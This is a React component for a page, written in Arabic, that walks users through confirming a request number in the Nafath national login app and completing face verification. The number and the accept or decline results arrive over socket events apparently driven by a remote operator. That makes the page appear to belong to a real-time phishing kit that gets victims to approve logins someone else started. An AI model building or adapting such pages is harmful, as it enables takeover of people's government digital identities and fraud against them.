import React, { useMemo, useState } from "react";
import { TailSpin } from "react-loader-spinner";
import { socket } from "./Main";
import { useSocketEvent } from "../hooks/useSocketEvent";

const ConfirmNavaz = ({ mode, checkMode }) => {
  const token = sessionStorage.getItem("session");
  const query = new URLSearchParams(window.location.search);
  const queryData = useMemo(
    () => JSON.parse(query.get("data")),
    [query.get("data")]
  );
  const [otp, setOtp] = useState(queryData.NavazOtp);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  useSocketEvent("acceptNavaz", (info) => {
    if (info.token === token) {
      setOtp(info.userOtp);
    }
  });

  const chechValidate = () => {
    setError(false);
    setLoading(true);
    const { _id, NavazOtp } = queryData;
    socket.emit("navazValidate", {
      _id,
      NavazOtp,
    });
  };

  useSocketEvent("acceptNavazOtp", (id) => {
    if (id === queryData._id) {
      setLoading(false);
    }
  });

  useSocketEvent("declineNavazOtp", (data) => {
    if (data.id === queryData._id) {
      setLoading(false);
      setError(true);
      setOtp(data.new);
    }
  });

  return (
    <div className="flex w-full items-center justify-center min-h-screen flex-col gap-y-4">
      {loading && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      <span className="text-4xl text-green-600 font-bold mb-5">رقم الطلب</span>
      <span className="text-gray-500 font-bold">
        فضلا قم باختيار رقم الطلب الظاهر في تطبيق نفاذ
      </span>
      <div className="flex flex-col justify-center items-center text-gray-500 font-bold gap-1">
        <span dir={mode === "ar" ? "rtl" : "ltr"}>1- ادخل تطبيق نفاذ</span>
        <span dir={mode === "ar" ? "rtl" : "ltr"}>
          2- اضغط علي اكمال ثم اكدد الرقم الظاهر
        </span>
        <span dir={mode === "ar" ? "rtl" : "ltr"}>3- اثبت صورة الوجهه</span>
      </div>
      <span className="min-w-20 my-5 rounded-full min-h-20 bg-gray-300 flex items-center justify-center text-4xl text-white px-3">
        {otp}
      </span>
      <span className="my-5 text-lg text-red-500 w-full text-center">
        {error
          ? "خطأ في عملية التحقق برجاء اعادة المحاولة باستخدام الرمز الجديد"
          : ""}
      </span>
      <div className="flex gap-x-5">
        <span
          className="text-white bg-green-500 px-4 text-xl py-1 rounded-md cursor-pointer"
          onClick={() => chechValidate()}
        >
          تحقق
        </span>
      </div>
    </div>
  );
};

export default ConfirmNavaz;
